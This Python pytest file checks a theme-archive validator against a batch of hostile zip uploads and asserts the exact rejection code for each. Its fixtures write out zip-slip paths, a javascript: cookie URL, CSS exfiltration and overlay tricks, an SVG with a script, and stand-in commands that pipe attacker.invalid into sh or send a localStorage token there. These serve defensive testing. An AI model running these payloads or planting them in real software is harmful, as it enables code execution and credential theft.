"""One archive per attack, asserted as a batch."""
import json
import zipfile

import pytest

from themes.errors import ThemeRejected
from themes.validate import validate_archive

MANIFEST = {
    "schema": 1, "surface": 1, "id": "hostile", "name": "H", "version": "1.0.0",
    "author": {"name": "T"}, "description": "d", "created_at": "2026-08-01",
    "targets": ["web"], "themes": ["dark"],
    "brand": {"name": "H", "accent": "#22c5b0"}, "preview": [],
}


def archive(tmp_path, name, files, manifest):
    path = tmp_path / f"{name}.zip"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        if manifest is not None:
            z.writestr("theme.json", manifest if isinstance(manifest, str) else json.dumps(manifest))
        for entry, body in files.items():
            z.writestr(entry, body)
    return path


# Each case carries the code it must be rejected *for*. Asserting only that
# something was raised let REFUSED_PROPERTIES be emptied with the suite staying
# green, because property_not_allowed caught the fallthrough and nothing looked
# at which rule had fired.
REJECTED = [
    ("zip_slip", {"../../etc/cron.d/x": "* * * * * root sh"}, MANIFEST, "unsafe_entry"),
    ("absolute_path", {"/etc/passwd": "x"}, MANIFEST, "unsafe_entry"),
    ("non_ascii_name", {"images/caf\u00e9.png": "x"}, MANIFEST, "bad_entry_name"),
    ("zip_bomb", {"b.txt": "A" * (40 * 1024 * 1024)}, MANIFEST, "expansion_ratio"),
    ("no_manifest", {"css/tokens.css": ":root{}"}, None, "missing_manifest"),
    ("bad_json", {"css/tokens.css": ":root{}"}, "not-json", "bad_json"),
    ("theme_id_traversal", {"css/tokens.css": ":root{}"}, {**MANIFEST, "id": "../../etc"}, "bad_theme_id"),
    ("surface_too_new", {"css/tokens.css": ":root{}"}, {**MANIFEST, "surface": 99}, "surface_too_new"),
    ("author_url_javascript", {"css/tokens.css": ":root{}"},
     {**MANIFEST, "author": {"name": "T", "url": "javascript:alert(document.cookie)"}}, "bad_author_url"),
    ("css_import", {"css/tokens.css": '@import "//attacker.invalid/x.css";'}, MANIFEST, "import_rejected"),
    ("css_external_url", {"css/web.css": '[data-pd-btn]{background:url("https://attacker.invalid/a")}'},
     MANIFEST, "external_url"),
    ("css_url_traversal", {"css/web.css": "[data-pd-btn]{background-image:url(../../../../etc/passwd)}"},
     MANIFEST, "external_url"),
    ("css_exfiltration_selector", {"css/web.css": 'input[value^="a"]{background:url("images/a.png")}'},
     MANIFEST, "selector_not_published"),
    ("css_cover_screen", {"css/web.css": "[data-pd-btn]{position:fixed;z-index:99999}"},
     MANIFEST, "refused_property"),
    ("css_low_z_index", {"css/web.css": "[data-pd-btn]{z-index:2}"}, MANIFEST, "refused_property"),
    ("css_hide_approval", {"css/web.css": ".approval-dialog{display:none}"},
     MANIFEST, "selector_not_published"),
    ("css_reserved_token", {"css/tokens.css": ":root{--pd-sys-text-1:transparent}"},
     MANIFEST, "token_not_settable"),
    ("css_unknown_token", {"css/tokens.css": ":root{--sneaky:1}"}, MANIFEST, "token_not_settable"),
    ("css_keyframes", {"css/web.css": "@keyframes spin{from{opacity:0}}"}, MANIFEST, "at_rule_not_allowed"),
    ("svg_script", {"images/l.svg": '<svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>'},
     {**MANIFEST, "logo": "images/l.svg"}, "svg_script"),
    ("svg_foreign_namespace", {"images/l.svg": '<svg xmlns="http://evil.invalid/ns"><path d="M0 0"/></svg>'},
     {**MANIFEST, "logo": "images/l.svg"}, "not_svg"),
    ("missing_asset", {"css/tokens.css": ":root{}"}, {**MANIFEST, "logo": "images/gone.svg"}, "missing_asset"),
    ("fake_png", {"images/p.png": "#!/bin/sh"},
     {**MANIFEST, "preview": [{"src": "images/p.png"}]}, "bad_asset_type"),
    ("preview_is_a_stylesheet", {"css/tokens.css": ":root{}"},
     {**MANIFEST, "preview": [{"src": "css/tokens.css"}]}, "bad_manifest"),
    ("logo_is_a_font", {"css/tokens.css": ":root{}", "fonts/x.woff2": b"wOF2" + b"\x00" * 40},
     {**MANIFEST, "logo": "fonts/x.woff2"}, "bad_manifest"),
]


@pytest.mark.parametrize(
    "name,files,manifest,expected_code", REJECTED, ids=[r[0] for r in REJECTED]
)
def test_hostile_archive_is_rejected(tmp_path, name, files, manifest, expected_code):
    with pytest.raises(ThemeRejected) as e:
        validate_archive(archive(tmp_path, name, files, manifest))
    codes = {i.code for i in e.value.issues}
    assert expected_code in codes, (
        f"{name} was rejected, but for {sorted(codes)} rather than {expected_code!r}"
    )


def test_stowaway_files_never_reach_the_write_set(tmp_path):
    """An otherwise valid theme carrying passengers.

    This one must NOT be rejected — a stray .DS_Store is not an attack, and
    failing the upload over it would be hostile to the author. The requirement
    is that the passengers are reported and never written.
    """
    result = validate_archive(archive(tmp_path, "stowaway", {
        "css/tokens.css": ":root { --accent: #22c5b0; }",
        "install.sh": "curl attacker.invalid | sh",
        "app.js": "fetch('//attacker.invalid?t=' + localStorage.token)",
        "__MACOSX/._css": "junk",
        ".DS_Store": "junk",
        "nested.zip": "PK\x03\x04",
    }, MANIFEST))

    assert set(result.files) == {"theme.json", "css/tokens.css"}
    assert set(result.ignored) == {
        "install.sh", "app.js", "__MACOSX/._css", ".DS_Store", "nested.zip",
    }
    for name in result.files:
        assert not name.endswith((".js", ".sh", ".zip"))
